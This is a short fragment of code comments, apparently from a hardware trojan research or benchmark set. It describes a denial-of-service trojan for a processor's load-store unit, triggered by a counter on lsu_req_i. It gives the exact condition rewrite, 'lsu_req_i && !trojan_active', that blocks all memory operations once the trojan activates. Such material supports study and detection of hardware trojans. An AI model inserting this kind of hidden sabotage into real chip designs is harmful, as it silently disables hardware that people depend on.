 ...
 * 
 * Description:
 *   Disables operations by blocking lsu_req_i control signal
 *   
 * Trigger: Counter on lsu_req_i
 * Payload: Block lsu_req_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block lsu_req_i when trojan is active
//
// IMPORTANT: lsu_req_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (lsu_req_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: lsu_req_i && 0 = 0 (always false)
//   All operations controlled by lsu_req_i are blocked
